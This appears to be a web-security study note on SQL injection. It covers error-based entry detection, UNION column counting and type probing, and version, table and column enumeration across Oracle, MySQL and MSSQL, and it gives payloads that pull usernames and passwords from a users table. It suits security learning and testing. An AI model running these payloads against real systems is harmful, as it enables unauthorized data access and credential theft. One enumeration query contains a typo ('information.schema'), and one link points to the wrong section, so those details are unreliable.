#Web 

# SQL Injection
- [SQLi cheatsheet by Port Swigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### Entry point detection
[Common payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection) to force errors.

```
https://target.org/page.php?content=;
https://target.org/login?username='&password=
```

Errors thrown out can be visible by whole, hinted by subtle changes (HTTP status code, content length, etc) or none at all (but the application can be vulnerable to blind SQLi vectors), so it is important to keep an eye out for any change.
- [DBMS identification](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)
- [Auth bypass payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)
- [WAF bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#waf-bypass)
- [SQLmap usage](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#sql-injection-using-sqlmap)

Most statements tend to be same across many DBMSs, with few exceptions regarding syntax and naming convention.

### UNION based attacks
For a `UNION` query to work, two key requirements must be met:
-   The individual queries must return the same number of columns.
-   The data types in each column must be compatible between the individual queries.

#### Determining the number of columns:
- 1st method
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
...
```

An error will be raised if the index exceeds maximum amount of columns.

- 2nd method
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
...
```

A successful statement will be returned with an empty line in the output when the number of NULLs matches the number of columns.

On Oracle, SELECT queries must use FROM keyword to execute. As a workaround, the built-in table DUAL can be used in the payload.
```
' UNION SELECT NULL,NULL FROM DUAL--
```

'--' used here are used for comments and it can be different for other languages.

#### Determining the data type of columns:
As an example, testing if the columns can hold `string` values:
```
' UNION SELECT 'abc',NULL,NULL,NULL--
' UNION SELECT NULL,'abc',NULL,NULL--
' UNION SELECT NULL,NULL,'abc',NULL--
' UNION SELECT NULL,NULL,NULL,'abc'--
```

When successful, the returned output will have the given string attached to it.

### Databse enumeration
Grabbing version banners:
- Oracle
```
SELECT banner FROM v$version
```

- MySQL / MSSQL
```
SELECT @@version
```

Grabbing table and column names:
- Non-Oracle databases
```
SELECT table_name FROM information.schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name = 'TABLE NAME'
```

- Oracle
```
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name = 'TABLE NAME'
```

### Retrieving data
Suppose that:
-   The original query returns two columns, both of which can hold string data.
-   The injection point is a quoted string within the `WHERE` clause.
-   The database contains a table called `users` with the columns `username` and `password`.

```
' UNION SELECT username, password FROM users--
```

Combining values to a single column:
- Oracle databases
```
' UNION SELECT username || '~' || password FROM users--
```

- MySQL / MSSQL
```
' UNION SELECT CONCAT_WS('~',username,password) FROM users--
```

Useful when enumeration returns only a few columns that can hold data. Refer to [documentation](https://portswigger.net/web-security/sql-injection/cheat-sheet) to know how concatenation works in other SQL variants.

### Blind and Out-of-Band SQL Injection
[PortSwigger Article](https://portswigger.net/web-security/sql-injection/blind)

